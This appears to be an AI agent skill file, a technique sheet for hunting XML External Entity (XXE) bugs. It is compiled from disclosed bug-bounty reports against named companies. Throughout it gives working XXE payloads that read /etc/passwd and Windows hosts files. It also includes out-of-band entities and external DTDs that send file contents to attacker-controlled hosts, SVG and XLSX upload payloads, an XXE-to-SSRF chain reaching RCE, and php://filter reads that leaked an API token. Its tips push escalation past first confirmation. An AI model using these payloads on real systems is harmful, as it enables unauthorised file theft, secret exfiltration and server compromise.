---
name: hunter-l3-xxe
description: "Use when hunting XXE on a target. Loads the L3 technique sheet: XML External Entity injection is a classic but still-paying bug class: any endpoint that parses attacker-controlled XML — request bodies, file uploads, sitemaps, SOAP, imports — becomes a reader of lo"
domain: cybersecurity
subdomain: web
tags:
- web
- xxe
- hunting
- l3
version: '1.0'
---

# XXE — Technique Sheet

## Overview
XML External Entity injection is a classic but still-paying bug class: any endpoint that parses attacker-controlled XML — request bodies, file uploads, sitemaps, SOAP, imports — becomes a reader of local files, a prober of internal networks, and occasionally a path to RCE. It pays whenever a parser is left with DOCTYPE/external-entity processing enabled (common with JAXB, PHP libxml with LIBXML_NOENT, Apache POI, ImageMagick SVG, translate-toolkit, cloudhopper). Blind XXE (OOB only) is the default mode; reflected XXE where file contents appear in the response or UI is the jackpot.

## Distinct sub-patterns

### 1. Direct in-band file read via SYSTEM entity in an XML body
- Endpoint shape: any POST that accepts XML, including JSON APIs that quietly accept XML content-type. Examples: `POST /ma/api/v2/user/login` (XML body), `POST /api/rest/mpapi/infaMPAPISearchWebService/query` (id=106797), `POST /api/sxmp/1.0`, `POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx`, `POST /ca/rest/certrequests`, `POST /RestApi/soap11`.
- Payload (verbatim, id=248668 X/xAI):
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<operation type="deliver">
<operatorId>&file;</operatorId>...
```
- Root cause: parser (JAXB, cloudhopper SXMP, .NET XML) resolves external entities. At xAI, /etc/passwd content was returned in an error message wrapping `operatorId` — error-reflection leaks entity values.
- Impact proven: file read (/etc/passwd, /etc/hostname, Windows hosts file), internal host probing.
- Exemplars: 248668 (xAI), 715949 (DoD RapidSpell), 2573567 (DoD certrequests — entity in `<ProfileID>`), 762251 (Starbucks SOAP `/RestApi/soap11`).

### 2. Blind XXE — OOB confirmation via HTTP fetch
- Endpoint shape: same XML-accepting endpoints; also `POST /user/login` (ownCloud, id=105980), `POST /api/search/GeneralSearch` (Uber, id=154096), YouTrack `PUT /import users` (VK, id=114476).
- Payload (id=154096 Uber, verbatim):
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/"> ]>
<GeneralSearch>&dtgmlf6ent;</GeneralSearch>
```
- Payload (id=105980 ownCloud): parameter entity `<!ENTITY % select SYSTEM "http://wallarm.tools/ok">%select;` inside DOCTYPE — confirmed in attacker's access.log.
- Root cause: parser resolves http:// entities even when file:// is filtered or when no response reflection exists.
- Impact proven: outbound server request to attacker host (blind XXE confirmed). VK's YouTrack bug (114476) additionally enabled file read, FTP exfiltration, TCP port scanning, and NTLM credential theft.
- Exemplars: 154096, 105980, 114476, 296622 (VK document upload, blind).

### 3. Out-of-band exfiltration via external DTD (file contents over HTTP)
- Endpoint shape: sitemap XML fetchers and any parser that loads remote DTDs: `GET /sitemap.xml` crawler (Elastic, id=1156748), Semrush Site Audit sitemap processing (id=312543), Informatica login (id=105753, FTP exfil).
- Payload (id=312543, verbatim):
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset[<!ENTITY % goodies SYSTEM "file:///etc/hostname">
<!ENTITY % dtd SYSTEM "http://dtd.webhooks.pw/files/combine.dtd">%dtd;]>
<urlset><url><loc>http://location.webhooks.pw/resp/&xxe;</loc></url></urlset>
```
- Payload (id=1156748 Elastic): DOCTYPE pulling `http://YOURDOMAIN.COM/exfil.dtd`, then `%dtd; %param1; %exfil;` — external DTD defines a parameter entity that reads `file:///etc/hostname` and embeds it in a request back to the attacker. Exfiltrated the Elastic Cloud instance's /etc/hostname (d403d12993e0).
- Root cause: parameter entities in an external DTD can wrap file contents into an HTTP request even when the primary document can't reflect them.
- Impact proven: /etc/hostname, /home directory listing, out-of-band GETs from Java/1.8.0_144 confirming exfil.
- Exemplars: 312543, 1156748, 105753 (FTP variant: PUBLIC entity `file:///etc/passwd` exfiltrated via FTP OOB).

### 4. XXE via file upload parsed as XML server-side
- Endpoint shapes (all distinct upload vectors in the records):
  - XLSX import: `POST /` project import (Informatica, id=105434) — payload `<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>` inside the XLSX sheet XML; read full /etc/passwd.
  - Generic file upload: Informatica upload (105787), VK document upload (296622), DoD webserver (188743): `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd"]><root>&xxe;</root>`.
  - Apache POI file parse (greenhouse.io via Internet Bug Bounty, id=25537): same simple entity payload; fixed upstream by Apache.
  - Weblate XLF translation upload (id=232614): download a project's XLF, add `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, re-upload — /etc/passwd rendered in the UI as a translation. Full chain: log in with Translate-group rights → download XLF → inject DOCTYPE → upload.
  - WordPress Media Library crafted `.wav` (id=1095645): on PHP 8 the media parser uses LIBXML_NOENT (libxml_disable_entity_loader deprecated), so a .wav whose header embeds an external-DTD XML chunk extracts /etc/passwd; also enables DoS, SSRF, Phar deserialization.
- Root cause: the upload's file-type gate checks extension, but the server parses the content as XML/XLSX regardless.
- Exemplars: 105434, 232614, 1095645, 25537, 296622.

### 5. XXE via SVG upload (SVG is XML)
- Endpoint shape: image/logo/emblem upload endpoints: `POST /apps/{id}/logo` (Coinbase, id=104620), Moneybird SVG upload (id=130661), Rockstar emblem editor SVG→PNG (id=347139), Starbucks HX dynamic page upload (id=500515).
- Payload (Coinbase, verbatim — SVG renamed to .jpg):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="20" y="20">&xxe;</text></svg>
```
- Root cause: server-side image processing (ImageMagick, XML logo parser) parses SVG as XML with entities enabled; extension rename (.jpg) bypasses the upload filter.
- Impact proven: Coinbase — server began executing the XML payload (video PoC); Rockstar — rendered file contents (C:\Windows\system32\drivers\etc\hosts) onto the emblem, full SSRF + LFI; Moneybird — XXE confirmed, program added scanning.
- Exemplars: 104620, 347139, 130661.

### 6. XXE in ImageMagick/SVG rendering with exfil-DTD + text rendering (Windows)
- Endpoint: Rockstar emblem editor SVG→PNG conversion (id=347139, above). Payload references an external DTD (`http://attacker.com/exfil.dtd`) whose `%data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"` entity is drawn into `<text>` inside a `<pattern>` — the PNG output contains the file contents. Also used a "double-slash SMB regex bypass" to load files from remote SMB shares. Impact: text-file extraction, HTTP response capture, full SSRF and LFI.

### 7. XXE chained into PHP object injection
- Endpoint shape: `POST /api/import_memes_2.0.php` (Brave, id=415967; h1-5411-CTF, id=416123).
- Payload: base64/serialized PHP object `O:10:"ConfigFile":1:{s:10:"config_raw";s:170:"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>...&xxe;...</root>";}`.
- Root cause: unserialize of user input → `ConfigFile::parse()` loads XML with LIBXML_NOENT|LIBXML_DTDLOAD while the libxml entity loader is enabled.
- Impact proven: 415967 — /etc/passwd read plus internal service enumeration (maintenance API on localhost:1337). 416123 — used `php://filter` in the entity to read `/proc/10/environ`, leaking a PAPERTRAIL_API_TOKEN, then queried the Papertrail API for 636KB of server logs.
- Exemplars: 415967, 416123.

### 8. XXE → SSRF → RCE (localhost admin service)
- Endpoint shape: `POST /PSIGW/PeopleSoftServiceListeningConnector` (DoD, id=710654).
- Payload: `<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:80/pspc/services/AdminService?method=%21--%3E...">` — an external entity that performs an SSRF GET to the local Apache Axis AdminService.
- Root cause: PeopleSoft connector parses XML with entities enabled; the entity fetch reaches localhost-only admin services (CVE-2017-3548).
- Impact proven: deployed a new Apache Axis service (`h1testservice`) — RCE potential and internal network access.
- Exemplar: 710654.

### 9. Second-order / URL-parameter XXE (server fetches attacker XML, then parses)
- Endpoint shape: `GET /conferences/get_recording_slides_xml.xml?url=<attacker-url>` (id=1028396): SSRF fetch of attacker-controlled XML which is then parsed with entities enabled; `GET /x.js?u=` at DuckDuckGo (id=483776→483774): entity payload in the `u` parameter, leaked world-readable files; Starbucks `hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_*.xml` (id=500515): upload a restricted-format XML to the server's tempfiles, then point `_hxpage` at it so the server parses it — bypassing doctype/entity filters at the parser stage.
- Impact proven: 1028396 program-confirmed XXE; 483774 leaked files; 500515 disclosed server info, DoS, potential NTLMv2 hash capture and (IIS 7.5 + ASP.NET + Windows) potential full server/domain compromise.
- Exemplars: 1028396, 483774, 500515.

### 10. Vendor/library-specific parsers (bug lives in the library, found via the app)
- Apache POI (25537, greenhouse.io), translate-toolkit XLF (232614, Weblate), cloudhopper SXMP (248668), JAXB (106797 — endpoint looked like a JSON API but accepted XML), ImageMagick (347139), PHP 8 libxml NOENT (1095645, WordPress). The pattern: identify the parsing library from error messages/behavior, then test entity payloads known to hit it. Also confirmed-but-undetailed: AEM Forms (1321070, CVE-2021-40722, Adobe stated RCE potential), Bime Connector Designer (112116), Informatica domain XXE (150520) — none disclosed payloads.

## Bypass / chain notes
- Filter bypass by extension rename: SVG-as-.jpg (104620). Upload format lists allowing xml/jpg/png still parsed the XML (500515).
- Blind → exfil chain: parameter entities + external DTD (312543, 1156748) or FTP entities (105753) when no in-band reflection exists. This is the standard escalation from a confirmed ping.
- PHP wrapper escalation: `php://filter` inside entities to read binary/protected files like /proc/10/environ (416123).
- Chaining seen in records: XXE → SSRF to localhost Axis AdminService → arbitrary service deploy → RCE (710654); PHP object injection → XXE → token leak → third-party API access to logs (415967, 416123); SSRF-fetch-then-parse (1028396); upload-then-parse via second reference (500515); XXE-driven file render into an image (347139).
- Error-message reflection: file contents surfaced in error output wrapping the entity position (248668) or in the UI (232614) or inside a generated image (347139) — reflection channels beyond the raw HTTP response.

## Gotchas / what NOT to do
- Don't assume a JSON API is safe to skip: Informatica's search web service accepted XML despite JSON presentation (106797).
- Don't conclude "no XXE" from a silent response — go OOB (HTTP ping like 154096/105980) before giving up; several records are blind-only.
- PHP 8 deprecated libxml_disable_entity_loader but parsers may still use LIBXML_NOENT — PHP 8 targets are live again (1095645).
- Don't stop at ping confirmation: every confirmed-blind record here escalated further via DTD exfil or FTP; /etc/hostname is a low-noise first read.
- On Windows targets, use `file:///c:\Windows\System32\Drivers\etc\hosts` (715949) and consider SMB shares (347139) — file:// on Windows paths differs from Unix payloads.
- Coordinate destructive primitives: DoS and NTLM-hash-capture side effects (500515, 715949, 114476) get flagged; demonstrate read, not crash.
- Some uploads need legitimate session context first (Weblate required Translate-group rights and downloading a real XLF) — build the chain within app workflow.

## Real-world impact examples
- Full /etc/passwd reads shown in reports: Informatica XLSX import (105434), Weblate XLF upload displayed as a translation (232614), X/xAI SXMP error reflection (248668), DoD RapidSpell Windows hosts file (715949).
- Exfiltration of /etc/hostname and directory listings from production clusters: Semrush Site Audit (312543), Elastic Cloud (1156748).
- RCE path: Apache Axis service deployed on a DoD PeopleSoft server via XXE→SSRF (710654, CVE-2017-3548); Adobe AEM Forms XXE with Adobe-acknowledged RCE potential (1321070, CVE-2021-40722).
- Secret exposure and cross-system compromise: Papertrail API token read from /proc/10/environ, yielding 636KB of server logs with CTF participant IPs (416123); internal maintenance API on localhost:1337 discovered via XXE-driven enumeration (415967); NTLM credential theft and port scanning from YouTrack XML import (114476); file contents rendered into a Rockstar crew emblem including SMB-sourced files (347139).